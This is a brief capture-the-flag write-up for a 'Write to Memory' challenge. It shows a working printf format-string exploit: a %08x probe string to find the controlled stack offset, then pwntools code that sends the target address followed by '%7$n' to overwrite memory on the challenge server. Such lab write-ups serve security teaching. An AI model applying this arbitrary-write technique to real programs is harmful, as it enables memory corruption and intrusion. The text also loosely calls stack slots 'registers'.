# Challenge `Write to Memory` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to write in arbitrary memory

## Steps to Reproduce

Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
we can verify that the 7th register is filled with `41414141` (the value of `AAAA`) which tells us that we control the 7th register.

To get the address of the `target` variable we use:
```py
elf = ELF("03_write")
target_address = elf.symbols['target']
```

Then, to get the flag, we connect to the server and send the following payload to write the adress of the `target` variable to the 7th register:
```py
io = connect(HOST, PORT)
payload = p32(target_address) + b"%7$n"
io.sendline(payload)
```

## Implementation

Implementation [here](write-to-memory.py).